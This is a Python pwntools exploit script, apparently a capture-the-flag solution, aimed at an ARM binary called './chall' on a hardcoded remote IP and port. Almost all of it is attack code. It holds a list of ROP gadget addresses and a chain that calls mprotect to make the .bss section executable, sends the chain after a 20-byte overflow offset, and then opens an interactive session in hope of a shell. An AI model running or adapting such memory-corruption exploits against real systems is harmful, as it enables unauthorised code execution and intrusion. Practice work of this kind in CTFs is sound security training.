from pwn import *

CONN = "nc 103.152.242.197 45840".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
b *main+92
c
""".format(
    **locals()
)


# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

STR_R3_R1_BX_LR = 0x00034a6c # : str r3, [r1] ; bx lr
STR_R3_R1_POP_R4_PC = 0x000588f8 #: str r3, [r1] ; pop {r4, pc}
STR_R3_TO_R2 = 0x0006314c #: str r3, [r2] ; pop {r4, pc}
STR_R3_TO_R2_BX_LR = 0x00024ddc #: str r3, [r2] ; bx lr
POP_R3_PC = 0x00010160
POP_R1_PC = 0x0006bf24
MOV_R2_R7_BLX_R3 = 0x00017a8c #: mov r2, r7 ; blx r3
POP_R0_PC = 0x0006be3c
POP_R7_PC = 0x00032210 #: pop {r7, pc}
POP_R4_PC = 0x00010518
POP_R4_R5_PC = 0x00016fdc #: pop {r4, r5, pc}

'''
0x000105b0 : pop {fp, pc}
0x0006be3c : pop {r0, pc}
0x0002ed64 : pop {r0, r4, pc}
0x0006bf24 : pop {r1, pc}
0x00010160 : pop {r3, pc}
0x0001540c : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00010518 : pop {r4, pc}
0x00016fdc : pop {r4, r5, pc}
0x00011374 : pop {r4, r5, r6, pc}
0x000426f0 : pop {r4, r5, r6, r7, fp, pc}
0x00010b7c : pop {r4, r5, r6, r7, pc}
0x0001fce4 : pop {r4, r5, r6, r7, r8, fp, pc}
0x00011218 : pop {r4, r5, r6, r7, r8, pc}
0x00057360 : pop {r4, r5, r6, r7, r8, sb, fp, pc}
0x0001c798 : pop {r4, r5, r6, r7, r8, sb, pc}
0x00010e40 : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x000168d4 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
0x0006301c : pop {r4, r5, r6, r7, r8, sl, pc}
0x000304e4 : pop {r4, r5, r7, pc}
0x00021dfc : pop {r4, r6, r7, pc}
0x00031934 : pop {r4, r7, pc}
0x00032210 : pop {r7, pc}
'''


'''
0x0001e6d4 : blx r1
0x00010860 : blx r2
0x000106c0 : blx r3
0x000183fc : blx r4
0x0001c96c : blx r5
0x0001fcb0 : blx r6
0x00016a78 : blx r7
0x00054670 : blx r8
0x0003d264 : blx sb

0x00016dc4 : bx lr
0x000250a8 : bx lr ; bx lr
0x00035dec : bx r2
0x0001049c : bx r3
'''
bss = elf.bss() # 0x99398


offset = 20

# Start program
io = start()

set_bss_exec = flat(
  POP_R0_PC,
  bss - 0x1398,
  # 0x407fe000,
  POP_R1_PC,
  0x4000,
  POP_R7_PC,
  0x7,
  POP_R3_PC,
  POP_R4_R5_PC, # set r3 to pop_r4_pc
  MOV_R2_R7_BLX_R3, #R4
  bss, #R5
  0x0001c96c, #PC
  elf.sym["mprotect"],
  POP_R4_PC, # set r3 to ret,
  elf.sym["main"],
  elf.sym["main"],
)

print(set_bss_exec)

payload = flat({
  offset: set_bss_exec
})

# Send the payload
# print(elf.got["system"])
# print(elf.sym.system)
# print(elf.plt.system)
sla(b":", payload)

# Got Shell?
io.interactive()